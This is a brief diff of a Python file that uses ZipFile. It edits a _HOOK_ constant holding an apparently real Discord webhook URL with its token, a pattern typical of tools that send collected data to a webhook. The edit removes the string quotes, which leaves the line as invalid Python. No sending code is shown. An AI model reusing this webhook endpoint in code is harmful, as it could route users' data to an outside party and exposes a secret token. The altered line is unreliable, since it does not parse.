@@ -24,7 +24,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 
 
 
-_HOOK_ = "{https://discord.com/api/webhooks/1126235761264574576/rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ/github}"
+_HOOK_ = {https://discord.com/api/webhooks/1126235761264574576/rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ/github}
 
 
 
